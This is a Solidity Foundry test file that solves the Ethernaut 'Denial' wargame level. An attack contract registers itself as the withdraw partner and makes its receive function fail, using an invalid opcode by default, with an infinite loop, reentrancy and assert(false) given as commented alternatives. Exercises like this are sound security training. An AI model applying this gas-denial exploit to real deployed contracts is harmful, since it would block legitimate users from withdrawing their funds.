// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IDenial {
  function setWithdrawPartner(address) external;
  function withdraw() external;
}

contract DenialAttack {
  IDenial internal challenge;

  constructor(address _challengeAddress) {
    challenge = IDenial(_challengeAddress);
  }

  function attack() public {
    challenge.setWithdrawPartner(address(this));
  }

  receive() external payable {
    // pick the alternative you fancy the most

    // alternative 1
    // infinite loop
    // "EvmError: OutOfGas"
    // while (true) {}

    // alternative 2
    // reentrancy attack
    // "EvmError: OutOfGas"
    // challenge.withdraw();

    // alternative 3
    // invalid opcode
    // "EvmError: InvalidOpcode"
    assembly { invalid() }

    // alternative 4
    // consume all the gas with an assert(false)
    // for some reason is not working in solidity > 0.8.5
    //   see this link
    //   https://ethereum.stackexchange.com/a/113362
    // assert(false);
  }
}

contract DenialTest is Test {
  address internal challengeAddress;
  DenialAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xD0a78dB26AA59694f5Cb536B50ef2fa00155C488, 0.001 ether);
    attackContract = new DenialAttack(challengeAddress);
  }

  function testExploit() public {
    attackContract.attack();
    utils.submitLevelInstance(challengeAddress);
  }
}
